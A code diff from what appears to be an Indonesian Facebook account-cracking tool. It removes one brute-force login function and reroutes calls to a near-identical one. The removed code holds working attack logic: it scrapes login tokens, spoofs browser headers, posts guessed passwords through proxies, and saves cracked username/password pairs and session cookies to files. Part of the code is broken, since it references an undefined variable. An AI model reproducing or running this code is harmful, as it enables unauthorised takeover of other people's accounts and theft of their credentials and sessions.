@@ -1336,11 +1336,11 @@ def passwrd():
                 if 'reguler' in method:
                     pool.submit(reguler,idf,pwv)
                 elif 'mbasic' in method:
-                    pool.submit(regulerv3,idf,pwv,"m.facebook.com")
+                    pool.submit(regulerv2,idf,pwv,"m.facebook.com")
                 elif 'validate' in method:
                     pool.submit(mbasic,idf,pwv)
                 else:
-                    pool.submit(regulerv3,idf,pwv,"m.facebook.com")
+                    pool.submit(regulerv2,idf,pwv,"m.facebook.com")
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
@@ -1355,77 +1355,13 @@ def passwrd():
 
 
 
-def regulerv3(idf,pwv,url):
-	global loop,ok,cp
-	rr = random.randint
-	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-	prog.update(des,description=f'\r[bold white]Reguler V2[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
-	prog.advance(des)
-	ua = random.choice(raka)
-	ses = requests.Session()
-	for pw in pwv:
-		pw = pw.lower()
-		try:
-			memek = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
-			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
-			'had_cp_prefilled': 'false',
-			'had_password_prefilled': 'false',
-			'is_smart_lock': 'true',
-			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-			"__dyn": "",
-			"__csr": "",
-			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
-			"__a": "",
-			"__user": "0",
-			"_fb_noscript": "true"}
-			head = {"Host": url,
-			"content-length": f"{len(str(date))}",
-			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
-			"sec-ch-ua-mobile": "?1",
-			"user-agent": ua,
-			"viewport-width": f"str(rr(400,989)",
-			"content-type": "application/x-www-form-urlencoded",
-			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
-			"x-asbd-id": "129477",
-			"x-requested-with": "mark.via.gp",
-			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
-			"sec-ch-prefers-color-scheme": "light",
-			"sec-ch-ua-platform": '"Android"',
-			"accept": "*/*",
-			"origin": "https://"+url,
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-dest": "empty",
-			"referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
-			"accept-encoding": "gzip, deflate, br",
-			"accept-language": "zh-CN;q=0.8,zh;q=0.9",
-			"x-response-format": "JSONStream"}		
-			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f' {P}[{K}Rudal CP{P}] {K}{idf}|{pw}')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f' {P}[{H}Rudal OK{P}] {H}{idf}|{pw}\n{kuki}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				break
-			else:continue
-		except requests.exceptions.ConnectionError:time.sleep(31)
-	loop+=1
-
-
 def regulerv2(idf,pwv,url):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f'\r[bold white]Reguler V2[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(raka)
+	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1593,7 +1529,7 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(raka)
+	ua=random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
